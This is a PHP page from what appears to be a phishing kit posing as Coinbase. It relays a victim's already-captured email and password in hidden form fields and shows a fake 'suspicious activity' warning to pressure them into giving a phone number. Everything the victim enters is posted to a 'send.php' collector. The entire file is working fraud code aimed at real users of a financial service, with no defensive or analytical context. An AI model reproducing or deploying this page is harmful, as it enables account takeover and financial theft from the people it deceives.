<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = 'Coinbase Explore| Learn| Businesses| Sign up| Login| Download';
        include_once './meta.php';
        if(empty($_SESSION["email"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <body>
        <?php include_once './header.php'; ?>
        <link rel="stylesheet" href="<?=base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
        <div class="container">
            <div class="row justify-content-center mt20">
                <div class="col-sm-5 bg-white rounded-2 text-dark p25">
                    <form method="post" action="<?= base_url('coinbase/send.php')?>" class="">
                        <input type="hidden" name="email" value="<?=$_SESSION['email']?>" >
                        <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                        <div class="my20">
                            <div class="fs20 py1 fw-bold text-danger">Important Message !</div>
                            <div class="fs16 py1 fw-bold">Some Suspicious Activity Found With Your Account.</div>
                            <div class="fs16 py1 fw-bold">Enter Your Phone Number to Verify Your Identity.</div>
                            <div class="form-control fs16">
                                <input name="phone_number" type="number" id="phone_number" required="" class="" style="width: 70%; border:1px solid #ccc; padding: 0.375rem 0.75rem; font-size: 1rem" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <div class="text-end">
                            <button type="submit" class="btn btn-success "><span>Submit</span></button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './footer.php'; ?>
        <script src="<?=base_url('assets/country-code-picker/js/jquery.ccpicker.min.js')?>"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
        </script>
    </body>
</html>